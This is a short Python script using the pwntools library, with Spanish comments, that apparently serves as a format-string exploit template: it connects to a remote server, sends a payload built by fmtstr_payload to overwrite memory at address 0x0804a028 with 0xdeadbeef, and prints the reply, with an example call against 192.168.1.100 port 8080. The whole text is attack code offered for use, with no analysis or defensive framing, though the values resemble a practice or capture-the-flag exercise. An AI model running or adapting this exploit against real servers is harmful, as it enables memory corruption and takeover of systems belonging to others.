from pwn import *

'''
Función para explotar la vulnerabilidad de 
"format string" en un servidor remoto.
'''

def exploit_server(ip_remota, puerto):
    r = remote(ip_remota, puerto)
    r.sendline(fmtstr_payload(6, {0x0804a028: 0xdeadbeef}))
    response = r.recv()
    print(response)

'''
Ejemplo de uso:

exploit_server('192.168.1.100', 8080)
'''